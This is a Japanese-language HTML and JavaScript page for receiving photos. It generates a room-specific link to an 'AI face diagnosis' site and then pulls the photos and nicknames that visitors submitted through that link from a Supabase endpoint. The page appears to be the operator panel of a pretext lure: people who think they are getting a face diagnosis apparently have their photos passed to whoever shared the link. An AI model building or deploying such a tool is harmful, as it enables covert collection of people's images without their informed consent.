<!DOCTYPE html>

<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信</title>

<style>

* {
  box-sizing: border-box;
}

body {
  font-family: sans-serif;
  background: linear-gradient(
    135deg,
    #111827,
    #312e81,
    #581c87
  );
  margin: 0;
  padding: 20px;
  min-height: 100vh;
}

.container {
  max-width: 600px;
  margin: auto;
  background: white;
  padding: 25px;
  border-radius: 24px;
  box-shadow:
    0 10px 40px rgba(0,0,0,0.35);
}

h1 {
  text-align: center;
}

p {
  line-height: 1.6;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 12px;
  background: #111827;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

button:active {
  transform: scale(0.98);
}

.roomBox {
  background: #f3f4f6;
  padding: 15px;
  border-radius: 12px;
  margin-top: 20px;
  word-break: break-all;
}

.roomId {
  font-weight: bold;
  color: #4f46e5;
}

.photo {
  margin-top: 20px;
  padding: 15px;
  background: #f5f5f7;
  border-radius: 15px;
}

.photo img {
  width: 100%;
  border-radius: 12px;
  margin-top: 10px;
}

.nickname {
  font-weight: bold;
  margin-top: 8px;
}

.status {
  margin-top: 15px;
  padding: 12px;
  background: #eef2ff;
  border-radius: 10px;
}

.error {
  background: #fee2e2;
  color: #991b1b;
}

.hidden {
  display: none;
}

</style>

</head>

<body>

<div class="container">

<h1>📷 写真受信</h1>

<p>
このページで作成したリンクから送られた写真を確認できます。
</p>

<button
id="createButton"
type="button"

>

🔗 リンクを作成 </button>

<div
  id="roomBox"
  class="roomBox hidden"
>

<div>
ルームID
</div>

<div
  id="roomId"
  class="roomId"
>
</div>

<button
id="copyButton"
type="button"

>

📋 診断リンクをコピー </button>

<button
id="openButton"
type="button"

>

🌐 診断サイトを開く </button>

</div>

<button
id="checkButton"
type="button"

>

📷 写真を確認 </button>

<div
  id="status"
  class="status hidden"
>
</div>

<div id="photos"></div>

</div>

<script>

const PHOTO_RECEIVER_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";

const DIAGNOSIS_URL =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


const createButton =
  document.getElementById(
    "createButton"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openButton =
  document.getElementById(
    "openButton"
  );

const checkButton =
  document.getElementById(
    "checkButton"
  );

const roomBox =
  document.getElementById(
    "roomBox"
  );

const roomIdElement =
  document.getElementById(
    "roomId"
  );

const status =
  document.getElementById(
    "status"
  );

const photos =
  document.getElementById(
    "photos"
  );


let currentRoom = "";


/* ランダムなルームID */

function createRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars[
        Math.floor(
          Math.random() *
          chars.length
        )
      ];

  }

  return result;

}


/* 診断リンク */

function getDiagnosisUrl() {

  return (
    DIAGNOSIS_URL +
    "?room=" +
    encodeURIComponent(
      currentRoom
    )
  );

}


/* リンク作成 */

createButton.addEventListener(
  "click",
  function() {

    currentRoom =
      createRoomId();

    localStorage.setItem(
      "receiverRoom",
      currentRoom
    );

    roomIdElement.textContent =
      currentRoom;

    roomBox.classList.remove(
      "hidden"
    );

    status.classList.add(
      "hidden"
    );

    photos.innerHTML = "";

  }
);


/* コピー */

copyButton.addEventListener(
  "click",
  async function() {

    if (!currentRoom) {
      return;
    }

    const link =
      getDiagnosisUrl();

    try {

      await navigator.clipboard.writeText(
        link
      );

      status.textContent =
        "診断リンクをコピーしました！";

      status.className =
        "status";

    } catch (error) {

      prompt(
        "このリンクをコピーしてください",
        link
      );

    }

  }
);


/* 診断サイトを開く */

openButton.addEventListener(
  "click",
  function() {

    if (!currentRoom) {
      return;
    }

    window.open(
      getDiagnosisUrl(),
      "_blank"
    );

  }
);


/* 写真確認 */

checkButton.addEventListener(
  "click",
  async function() {

    if (!currentRoom) {

      status.textContent =
        "先に「リンクを作成」を押してください。";

      status.className =
        "status error";

      return;
    }


    status.textContent =
      "写真を確認しています…";

    status.className =
      "status";

    photos.innerHTML = "";


    try {

      const response =
        await fetch(
          PHOTO_RECEIVER_URL +
          "?room=" +
          encodeURIComponent(
            currentRoom
          )
        );


      const data =
        await response.json();


      if (!response.ok) {

        throw new Error(
          data.error ||
          "写真の取得に失敗しました"
        );

      }


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        status.textContent =
          "まだ写真は届いていません。";

        return;

      }


      status.textContent =
        data.photos.length +
        "枚の写真が届いています。";


      data.photos.forEach(
        function(photo, index) {

          const box =
            document.createElement(
              "div"
            );

          box.className =
            "photo";


          const title =
            document.createElement(
              "div"
            );

          title.textContent =
            "📷 写真 " +
            (index + 1);


          const name =
            document.createElement(
              "div"
            );

          name.className =
            "nickname";

          name.textContent =
            "👤 " +
            (
              photo.nickname ||
              "名前なし"
            ) +
            " さん";


          const image =
            document.createElement(
              "img"
            );

          image.src =
            photo.url;

          image.alt =
            "受信した写真";


          box.appendChild(
            title
          );

          box.appendChild(
            name
          );

          box.appendChild(
            image
          );


          photos.appendChild(
            box
          );

        }
      );


    } catch (error) {

      console.error(error);

      status.textContent =
        "エラー: " +
        error.message;

      status.className =
        "status error";

    }

  }
);


/* 前回のルームを復元 */

const savedRoom =
  localStorage.getItem(
    "receiverRoom"
  );


if (savedRoom) {

  currentRoom =
    savedRoom;

  roomIdElement.textContent =
    currentRoom;

  roomBox.classList.remove(
    "hidden"
  );

}

</script>

</body>
</html>
